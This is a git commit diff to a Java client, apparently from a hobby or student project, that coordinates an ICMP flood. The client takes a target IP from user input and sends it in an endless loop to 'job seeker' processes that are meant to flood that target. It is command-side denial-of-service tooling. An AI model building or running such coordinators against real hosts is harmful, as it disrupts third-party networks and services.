0e129d4f648443aa4088076ea06699a3c84b01e6
cursit2 <66439983+cursit2@users.noreply.github.com>
2020-11-30 09:14:19 -0500

    Update JobCreatorICMPAttack.java
    cleaned up code, now loops

--- JobCreatorICMPAttack.java
+++ JobCreatorICMPAttack.java
@@ -1,9 +1,7 @@
-
-import org.pcap4j.packet.IllegalRawDataException;
-
 import java.io.IOException;
 import java.io.PrintWriter;
 import java.net.Socket;
+import java.util.Scanner;
 
 
 /*The job creator ask more than one job seeker to execute an ICMP flood attack against a given IP or subnet
@@ -11,18 +9,22 @@ import java.net.Socket;
   the target IP address creating an ICMP flood attack.
  */
 public class JobCreatorICMPAttack{ //client
-    public static void main(String[] args) throws IOException, IllegalRawDataException {
+    public static void main(String[] args) {
         String targetIP = "0.0.0.0"; //dummy IP. attacking real IP might be a bad idea
-        try{ //connected to JobSeeker
-            Socket s = new Socket("localhost", 4999);
-            System.out.println("enter the target IP Address");
-            PrintWriter pr = new PrintWriter(s.getOutputStream());
-            //send target IP to jobSeeker
-            pr.println(targetIP);
-            pr.flush();
+        Scanner sc = new Scanner(System.in);
+        System.out.println("enter the target IP Address");
+        targetIP = sc.nextLine();
+        while (true) { // connect to JobSeekerICMPAttack, give IP, repeat
+            try { //connected to JobSeeker
+                Socket s = new Socket("localhost", 4999);
+                PrintWriter pr = new PrintWriter(s.getOutputStream());
+                //send target IP to jobSeeker
+                pr.println(targetIP);
+                pr.flush();
 
-        }catch(IOException e){
-            System.out.println("Connection failed. Abort");
+            } catch (IOException e) {
+                System.out.println("Connection failed. Abort");
+            }
         }
     }
 }
